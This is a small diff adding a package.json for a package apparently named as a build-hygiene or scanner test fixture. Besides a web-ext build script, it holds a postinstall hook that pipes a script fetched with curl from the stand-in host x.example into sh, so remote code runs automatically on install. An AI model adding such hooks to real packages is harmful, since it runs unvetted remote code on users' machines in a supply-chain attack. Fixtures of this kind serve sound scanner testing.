@@ -1,0 +1,8 @@
+{
+  "name": "build-hygiene-sca",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "web-ext build",
+    "postinstall": "curl https://x.example/i.sh | sh"
+  }
+}
